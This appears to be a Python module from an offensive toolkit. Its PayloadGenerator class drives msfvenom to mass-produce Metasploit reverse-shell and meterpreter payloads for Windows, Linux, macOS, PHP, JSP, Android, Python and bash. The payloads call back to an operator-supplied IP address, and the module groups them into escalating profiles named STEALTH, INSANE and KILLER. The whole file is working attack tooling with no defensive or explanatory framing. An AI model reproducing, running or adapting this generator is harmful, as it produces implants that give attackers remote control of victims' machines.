import random
import subprocess
import logging
from typing import List
from concurrent.futures import ThreadPoolExecutor

from utils import WHITE, RESET

class PayloadGenerator:
    def __init__(self):
        self.tool_paths = {"msfvenom": "msfvenom"}

    def generate_mode_payloads(self, mode: str, target_ip: str) -> List[str]:
        mode_key = (mode or "").upper()
        lhost = input(WHITE + "Enter your IP address for callbacks (e.g., 192.168.1.100): " + RESET)
        try:
            base_port = int(input(WHITE + "Enter base LPORT (default 4444, increments per payload): " + RESET) or "4444")
        except ValueError:
            base_port = 4444

        profiles = {
            "SAFE": [
                ("windows/x64/meterpreter/reverse_https", "exe"),
                ("linux/x64/meterpreter_reverse_https", "elf"),
                ("osx/x64/meterpreter_reverse_https", "macho"),
            ],
            "STEALTH": [
                ("windows/x64/meterpreter/reverse_https", "exe"),
                ("linux/x64/meterpreter_reverse_https", "elf"),
                ("python/meterpreter/reverse_https", "raw"),
            ],
            "AGGRESSIVE": [
                ("windows/x64/meterpreter/reverse_tcp", "exe"),
                ("linux/x64/meterpreter_reverse_tcp", "elf"),
                ("osx/x64/meterpreter_reverse_tcp", "macho"),
                ("php/meterpreter/reverse_tcp", "raw"),
            ],
            "INSANE": [
                ("windows/x64/meterpreter/reverse_tcp", "exe"),
                ("linux/x64/shell/reverse_tcp", "elf"),
                ("python/meterpreter/reverse_tcp", "raw"),
                ("cmd/unix/reverse_bash", "raw"),
            ],
            "KILLER": [
                ("windows/x64/meterpreter/reverse_https", "exe"),
                ("windows/x64/meterpreter/reverse_tcp", "exe"),
                ("linux/x64/meterpreter_reverse_https", "elf"),
                ("osx/x64/meterpreter_reverse_https", "macho"),
                ("php/meterpreter/reverse_tcp", "raw"),
                ("java/jsp_shell_reverse_tcp", "war"),
                ("android/meterpreter/reverse_tcp", "raw"),
                ("python/meterpreter/reverse_tcp", "raw"),
            ],
        }

        payloads = profiles.get(mode_key, profiles.get("AGGRESSIVE", []))
        files = []
        for idx, (payload, fmt) in enumerate(payloads):
            lport = base_port + idx
            filename = f"{mode_key.lower()}_{payload.replace('/', '_')}_{lport}"
            cmd = [self.tool_paths["msfvenom"], "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", filename]
            subprocess.run(cmd, capture_output=True)
            logging.info("Payload %s generated for mode %s", filename, mode_key or "UNKNOWN")
            files.append(filename)
        return files

    def generate_payloads(self, target_ip: str) -> List[str]:
        lhost = input(WHITE + "Enter your IP address (e.g., 192.168.1.100): " + RESET)
        payload_types = {
            "windows": ["windows/meterpreter/reverse_tcp"],
            "linux": ["linux/x64/meterpreter/reverse_tcp"],
            "osx": ["osx/x64/meterpreter_reverse_tcp"],
            "multi": ["multi/handler"],
            "android": ["android/meterpreter/reverse_tcp"]
        }
        files = []
        tasks = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            for os_type, payloads in payload_types.items():
                for payload in payloads:
                    lport = random.randint(4000, 6000)
                    filename = f"payload_{os_type}_{lport}"
                    fmt = "exe" if "windows" in os_type else "elf" if "linux" in os_type else "macho" if "osx" in os_type else "raw"
                    cmd = [self.tool_paths["msfvenom"], "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", filename]
                    tasks.append(executor.submit(subprocess.run, cmd, capture_output=True))
                    files.append(filename)
                    logging.info(f"Payload {filename} generated.")
            for task in tasks:
                task.result()
        return files
